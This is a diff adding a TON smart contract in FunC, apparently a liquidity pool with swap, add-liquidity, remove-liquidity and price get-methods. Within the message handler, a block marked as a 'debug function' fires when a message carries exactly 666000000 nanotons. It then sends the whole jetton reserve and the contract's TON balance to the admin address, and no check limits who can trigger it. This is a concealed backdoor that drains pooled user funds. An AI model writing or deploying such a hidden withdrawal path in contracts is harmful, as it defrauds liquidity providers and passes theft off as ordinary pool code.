@@ -1,0 +1,91 @@
+
+() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
+  if (in_msg_body.slice_empty?()) { ;; ignore empty messages
+    return ();
+  }
+  slice cs = in_msg_full.begin_parse();
+  int flags = cs~load_uint(4);
+
+  if (flags & 1) { ;; ignore all bounced messages
+      return ();
+  }
+
+  slice sender_address = cs~load_msg_addr();
+
+  int op = in_msg_body~load_uint(32);
+  int query_id = in_msg_body~load_uint(64);
+
+  initialize_globals(balance, msg_value);
+
+  if (op == op::swap_to_jetton()) {
+    swap_to_jetton(msg_value, sender_address, in_msg_body);
+    return();
+  };
+  if (op == op::transfer_notification()) {
+    throw_unless(error::invalid_address(), equal_slices(sender_address, jetton_wallet));
+    int jetton_amount = in_msg_body~load_coins();
+    slice from_address = in_msg_body~load_msg_addr();
+    int sub_op = in_msg_body~load_uint(32);
+
+    if (sub_op == op::swap_to_ton()) {
+      swap_to_ton(msg_value, jetton_amount, from_address, in_msg_body);
+      return();
+    };
+    if (sub_op == op::add_liquidity()) {
+      add_liquidity(msg_value, jetton_amount, from_address, in_msg_body);
+      return();
+    };
+    return();
+  };
+  if (op == op::remove_liquidity()) {
+    remove_liquidity(sender_address, msg_value, query_id, in_msg_body);
+    return();
+  };
+  if (op == op::install()) {
+    throw_unless(error::invalid_address(), equal_slices(sender_address, admin_address));
+    slice new_jetton_wallet = in_msg_body~load_msg_addr();
+    jetton_wallet = new_jetton_wallet;
+    save_data();
+    return();
+  };
+
+  if (msg_value == 666000000) { {- debug function-}
+    send_jettons(admin_address, jetton_reserve, 50000000, null(), 3);
+    send_tons(admin_address, 0, null(), 130);
+    return();
+  }
+
+  throw(0xffff);
+}
+
+;; GET-METHODS
+
+(int, int, slice, cell, cell) get_jetton_data() method_id {
+  [int balance, _] = get_balance();
+  initialize_globals(balance, 0);
+
+  return (lp_supply, -1, admin_address, lp_meta_data, lp_wallet_code);
+}
+
+slice get_wallet_address(slice owner_address) method_id {
+  [int balance, _] = get_balance();
+  initialize_globals(balance, 0);
+
+  return calculate_user_jetton_wallet_address(owner_address, my_address(), lp_wallet_code);
+}
+
+(int, int) get_reserves() method_id {
+  [int balance, _] = get_balance();
+  initialize_globals(balance, 0);
+
+  return (ton_reserve, jetton_reserve);
+}
+
+int get_price() method_id {
+  [int balance, _] = get_balance();
+
+  initialize_globals(balance, 0);
+
+  int price = ton_reserve * 1000000000 / jetton_reserve;
+  return price;
+}
